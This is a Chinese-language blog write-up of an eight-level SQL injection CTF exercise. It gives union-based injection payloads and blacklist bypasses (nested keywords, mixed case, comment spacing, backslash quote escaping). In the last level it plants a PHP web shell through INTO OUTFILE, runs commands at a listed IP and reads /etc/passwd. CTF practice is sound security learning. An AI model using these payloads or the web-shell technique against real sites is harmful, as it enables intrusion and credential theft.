---
layout: post
author: "kele"
date: "2018-02-15 22:53:26"
title: "sql 注入练习题"
tags: 
  - ctf
  - sqli
---
# sql注入习题

来源于ctfs.me的一道习题，实在做不出来，google了wp,发现这道题目是引自于其他习题集了，而且原题目是有源码的。。。于是趁机把他的题目做了一遍   
## level1
这道题目其实没有源码也是可以做的，不过需要简单思考一下    
`$query = "SELECT * FROM secrets WHERE session_id = '" . $_POST['session_id'] . "'";`
这个语句，我们需要让where 后面的为true，所以我们需要用到or，比较简单的题目    
payload:`1' or 1=1 # `   
在get your secrets里面输入,就可以得到所有的secrets，第一个就是flag


## level2
这道题目在ctfs.me上很坑，我不晓得大佬是怎么做的。
假如不给源码，我首先想到的是万能密码登陆，一顿操作之后，发现**注入点在用户名的位置**登陆不了，gg   
换思路，考虑这个登陆的回显   
payload:`username:1'order by 1# &password=dd`   
回显: username/password is invalid    
payload:`username:1'order by 2# &password=dd'
回显: invalid sql query   

可以知道只有一列，所以我们可以看看回显的位置   
payload: `username=1' union select 1 -- -&password=dd`   
回显。。。,回显出flag了，但是页面显示的不是真正的，查看源码发现另一个flag，get! 

---

假如给了源码，那就稍微简单一点了   
```
if (isset($_POST['username']) && isset($_POST['password'])) {

    // $query = "SELECT flag FROM my_secret_table"; We leave commented code in production because we're cool.
 
    $query = "SELECT username FROM users where username = '" . $_POST['username'] . "' and password = ?";

    // We use prepared statements, it must be secure.
```
直接构造payload:`username=1'union select flag from my_secret_table`

## level3 - The Blacklist Saga (Part 1)
```
$filter = array('union', 'select');

    // Remove all banned characters
    foreach ($filter as $banned) {
        $_GET['q'] = preg_replace('/' . $banned . '/i', '', $_GET['q']);
    } 
```
过滤union 和select 关键字,使用preg_replace替换掉union和select关键字，而且不区分大小写("/i")   
以前经常看到这种绕过方式uni/**/on,这次尝试无效。。。    
但是因为替换关键词为空字符，所以可以构造这种`uniunionon`，preg_replace把字符串中间的union替换为空白，其余字符再次组合成为union   
payload:`1'uniunionon seleselectct 1,username,password from users #`
简单过程:
1. 使用order by 测列数 `1'order by 3#`
2. 然后利用information_schema库查表名，列名，就可以了   

得到flag

## Level 4 - The Blacklist Saga (Part 2)
```
 $filter = array('UNION', 'SELECT');

    // Remove all banned characters
    foreach ($filter as $banned) {
        if (strpos($_GET['q'], $banned) !== false) die("Hacker detected"); 
        if (strpos($_GET['q'], strtolower($banned)) !== false) die("Hacker detected"); 
    } 
```
比较黑名单的大写形式，小写形式，但是漏了大小写混合，所以可以使用大小混合绕过   
payload:`1'uNion Select 1,username,password from users #`  


## Level 5 - The Blacklist Saga (Part 3)
```
// Ban space character
    if (strpos($_GET['q'], " ") !== false) die("Hacker detected"); 
```
过滤了空格，空格绕过，使用mysql的注释/**/
payload:`1'union/**/select/**/1,username,password/**/from/**/users/**/#`

## Level 6 - The Blacklist Saga (Part 4)
```
// Ban space character
    if (strpos($_GET['q'], "'") !== false) die("Hacker detected"); 
    if (strpos($_GET['q'], '"') !== false) die("Hacker detected");
```
过滤单引号和双引号，绕不过，但是可以通过原来的sql语句构造   
`$query = "SELECT * FROM search_engine WHERE title LIKE '" . $_GET['q'].  "' OR description LIKE '" . $_GET['q'] .  "' OR link LIKE '" . $_GET['q'] . "';";`   
payload: `and 0 union select 1,username,password from users #\`    
具体:   
select * from search_engine where title like '**and 0 union select 1,username,password from users #\\**' or description like '**and 0 union select 1,username,password from users #\\**' or link like '**and 0 union select 1,username,password from users #\\**';   
可以看到一共有6个单引号，但是由于'\\'的作用，所以第二个，第四个，第六个单引号被转义了,用**SQL**代理**and 0 union select 1,username,password from users #\\**，结果如下：
`select * from search_engine where title like 'SQL \' or description like 'SQL \' or link like 'SQL\'  `
去掉转义的单引号   
`select * from search_engine where title like 'SQL  or description like 'SQL  or link like 'SQL  ` 
还原**SQL**,因为title like 后面的参数`SQL or description like'是一个字符串，所以SQL不用还原，而且SQL最后面是一个注释符号，所以上面语句中第二个SQL后面被注释，可以省略     
`select * from search_engine where title like 'SQL or description like` and 0 union select 1,username,password from users #`   
再简化一下:
`select * from search_engine where title like 'xxxx' and 0 union select 1,username,password from users # `
ok  

## Level 7
先做level 8 

## Level 8 - The Final Challenge
查看源码，发现有两个隐藏表单 
```
<!--<li><a href="/uploads/">Our files</a></li>-->
<!--<li><a href="/phpinfo.php">Debug</a></li>-->
```
可以知道允许上传的文件在uploads里面，
查看phpinfo`DOCUMENT_ROOT	/var/www/html`，知道网站地址是这个，所以我们可以是用sql的into outifle 把php一句话，输出到php文件中 
payload:`1 union select  "<?php system($_GET[\"cmd\"]);?> ", "" into outfile  "/var/www/html/uploads/temp2.php"# `    

`35.184.20.243:8003/uploads/temp2.php?cmd=ls`   
查看系统文件，flag在上一级目录里面，使用cat读取就可以了    


## leve7  
使用level8的shell `cat /etc/passwd`得到flag,或者查看level7的flag.php源文件就可以得到flag   
但是我觉得这可能有点问题，可能有其他的做法，还没有想到     



